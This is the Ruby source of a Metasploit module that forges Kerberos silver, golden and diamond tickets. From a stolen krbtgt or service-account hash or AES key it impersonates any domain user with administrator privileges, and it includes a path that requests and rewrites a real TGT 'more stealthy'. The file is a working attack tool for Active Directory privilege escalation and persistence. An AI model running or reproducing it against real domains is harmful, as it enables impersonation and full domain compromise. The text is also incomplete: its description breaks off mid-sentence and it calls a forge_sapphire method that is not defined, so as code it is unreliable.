##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Kerberos::Client
  include Msf::Exploit::Remote::Kerberos::Ticket

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kerberos Silver/Golden Ticket Forging',
        'Description' => %q{
          This module forges a Kerberos ticket. Four different techniques can be used:
          - Silver ticket: Using a service account hash, craft a ticket impersonating any user and privileges to that account.
          - Golden ticket: Using the krbtgt hash, craft a ticket impersonating any user and privileges.
          - Diamond ticket: Authenticate to
        },
        'Author' => [
          'Benjamin Delpy', # Original Implementation
          'Dean Welch', # Metasploit Module
          'alanfoster', # Enhancements
          'smashery' # Enhancements
        ],
        'References' => [
          %w[URL https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it]
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [],
          'SideEffects' => [],
          'Reliability' => [],
          'AKA' => ['Silver Ticket', 'Golden Ticket', 'Diamond Ticket', 'Sapphire Ticket', 'Ticketer', 'Klist']
        },
        'Actions' => [
          ['FORGE_SILVER', { 'Description' => 'Forge a Silver Ticket' } ],
          ['FORGE_GOLDEN', { 'Description' => 'Forge a Golden Ticket' } ],
          ['FORGE_DIAMOND', { 'Description' => 'Forge a Diamond Ticket' } ],
          ['FORGE_SAPPHIRE', { 'Description' => 'Forge a Sapphire Ticket' } ],
        ],
        'DefaultAction' => 'FORGE_SILVER'
      )
    )

    based_on_real_ticket_condition = ['ACTION', 'in', %w[FORGE_DIAMOND FORGE_SAPPHIRE]]
    forged_manually_condition = ['ACTION', 'in', %w[FORGE_SILVER FORGE_GOLDEN]]

    register_options(
      [
        OptString.new('USER', [ true, 'The Domain User' ]),
        OptInt.new('USER_RID', [ true, "The Domain User's relative identifier(RID)", Rex::Proto::Kerberos::Pac::DEFAULT_ADMIN_RID]),
        OptString.new('NTHASH', [ false, 'The krbtgt/service nthash' ]),
        OptString.new('AES_KEY', [ false, 'The krbtgt/service AES key' ]),
        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
        OptString.new('DOMAIN_SID', [ false, 'The Domain SID, Ex: S-1-5-21-1755879683-3641577184-3486455962'], conditions: forged_manually_condition),
        OptString.new('EXTRA_SIDS', [ false, 'Extra sids separated by commas, Ex: S-1-5-21-1755879683-3641577184-3486455962-519']),
        OptString.new('SPN', [ false, 'The Service Principal Name (Only used for silver ticket)'], conditions: %w[ACTION == FORGE_SILVER]),
        OptInt.new('DURATION', [ false, 'Duration of the ticket in days', 3650], conditions: forged_manually_condition),

        OptString.new('REQUEST_USER', [false, 'The user to request a ticket for, to base the forged ticket on'], conditions: based_on_real_ticket_condition),
        OptString.new('REQUEST_PASSWORD', [false, "The user's password, used to retrieve a base ticket"], conditions: based_on_real_ticket_condition),
        OptAddress.new('RHOSTS', [false, 'The address of the KDC' ], conditions: based_on_real_ticket_condition),
        OptInt.new('RPORT', [false, "The KDC server's port", 88 ], conditions: based_on_real_ticket_condition),
        OptInt.new('Timeout', [false, 'The TCP timeout to establish Kerberos connection and read data', 10], conditions: based_on_real_ticket_condition)
      ]
    )

    register_advanced_options(
      [
        OptString.new('SessionKey', [ false, 'The session key, if not set - one will be generated' ], conditions: forged_manually_condition),
        OptBool.new('IncludeTicketChecksum', [ false, 'Adds the Ticket Checksum to the PAC', false], conditions: forged_manually_condition)
      ]
    )
  end

  SECS_IN_DAY = 60 * 60 * 24

  def run
    case action.name
    when 'FORGE_SILVER'
      forge_silver
    when 'FORGE_GOLDEN'
      forge_golden
    when 'FORGE_DIAMOND'
      forge_diamond
    when 'FORGE_SAPPHIRE'
      forge_sapphire
    else
      fail_with(Msf::Module::Failure::BadConfig, "Invalid action #{action.name}")
    end
  end

  private

  def forge_ccache(sname:, flags:, is_golden:)
    enc_key, enc_type = get_enc_key_and_type

    start_time = Time.now.utc
    end_time = start_time + SECS_IN_DAY * datastore['DURATION']

    ccache = forge_ticket(
      enc_key: enc_key,
      enc_type: enc_type,
      start_time: start_time,
      end_time: end_time,
      sname: sname,
      flags: flags,
      domain: datastore['DOMAIN'],
      username: datastore['USER'],
      user_id: datastore['USER_RID'],
      domain_sid: datastore['DOMAIN_SID'],
      extra_sids: extra_sids,
      session_key: datastore['SessionKey'].blank? ? nil : datastore['SessionKey'].strip,
      ticket_checksum: datastore['IncludeTicketChecksum'],
      is_golden: is_golden
    )

    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ccache, framework_module: self)

    if datastore['VERBOSE']
      print_ccache_contents(ccache, key: enc_key)
    end
  end

  def forge_silver
    validate_spn!
    validate_sid!
    validate_key!
    sname = datastore['SPN'].split('/', 2)
    flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(silver_ticket_flags)
    forge_ccache(sname: sname, flags: flags, is_golden: false)
  end

  def forge_golden
    validate_sid!
    validate_key!
    sname = ['krbtgt', datastore['DOMAIN'].upcase]
    flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(golden_ticket_flags)
    forge_ccache(sname: sname, flags: flags, is_golden: true)
  end

  def forge_diamond
    validate_key!
    domain = datastore['DOMAIN'].upcase

    enc_key, enc_type = get_enc_key_and_type
    if enc_type == Rex::Proto::Kerberos::Crypto::Encryption::AES256
      # This should be the server's preferred encryption type, so we can just
      # send our default types, expecting that to be selected. More stealthy this way.
      offered_etypes = Rex::Proto::Kerberos::Crypto::Encryption::DefaultOfferedEtypes
    else
      offered_etypes = [enc_type]
    end

    begin
      res = send_request_tgt(
        server_name: "krbtgt/#{domain}",
        client_name: datastore['REQUEST_USER'],
        password: datastore['REQUEST_PASSWORD'],
        realm: domain,
        offered_etypes: offered_etypes,
        stop_if_preauth_not_required: false
      )
    rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
      print_error("Requesting TGT failed: #{e.message}")
      return
    end

    if res.krb_enc_key[:enctype] != enc_type
      print_error("Response has incorrect encryption type (#{res.krb_enc_key[:enctype]})")
      return
    end

    ticket = modify_ticket(res, datastore['USER'], datastore['USER_RID'], extra_sids, enc_type, enc_key)
    ticket = Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])

    if datastore['VERBOSE']
      print_ccache_contents(ticket, key: enc_key)
    end
  end

  def get_enc_key_and_type
    enc_type = nil
    key = nil
    if datastore['NTHASH']
      enc_type = Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC
      key = datastore['NTHASH']
    elsif datastore['AES_KEY']
      key = datastore['AES_KEY']
      if datastore['AES_KEY'].size == 64
        enc_type = Rex::Proto::Kerberos::Crypto::Encryption::AES256
      else
        enc_type = Rex::Proto::Kerberos::Crypto::Encryption::AES128
      end
    end

    enc_key = key.nil? ? nil : [key].pack('H*')
    [enc_key, enc_type]
  end

  def validate_spn!
    unless datastore['SPN'] =~ %r{.*/.*}
      fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid SPN, must be in the format <service class>/<host><realm>:<port>/<service name>. Ex: cifs/host.realm.local')
    end
  end

  def validate_sid!
    unless datastore['DOMAIN_SID'] =~ /^S-1-[0-59]-\d{2}/
      fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid DOMAIN_SID. Ex: S-1-5-21-1266190811-2419310613-1856291569')
    end
  end

  def validate_key!
    if datastore['NTHASH'].blank? && datastore['AES_KEY'].blank?
      fail_with(Msf::Exploit::Failure::BadConfig, 'NTHASH or AES_KEY must be set for forging a ticket')
    elsif datastore['NTHASH'].present? && datastore['AES_KEY'].present?
      fail_with(Msf::Exploit::Failure::BadConfig, 'NTHASH and AES_KEY may not both be set for forging a ticket')
    end

    if datastore['NTHASH'].present? && datastore['NTHASH'].size != 32
      fail_with(Msf::Exploit::Failure::BadConfig, "NTHASH length was #{datastore['NTHASH'].size} should be 32")
    end

    if datastore['AES_KEY'].present? && (datastore['AES_KEY'].size != 32 && datastore['AES_KEY'].size != 64)
      fail_with(Msf::Exploit::Failure::BadConfig, "AES key length was #{datastore['AES_KEY'].size} should be 32 or 64")
    end
  end

  def extra_sids
    (datastore['EXTRA_SIDS'] || '').split(',').map(&:strip).reject(&:blank?)
  end
end
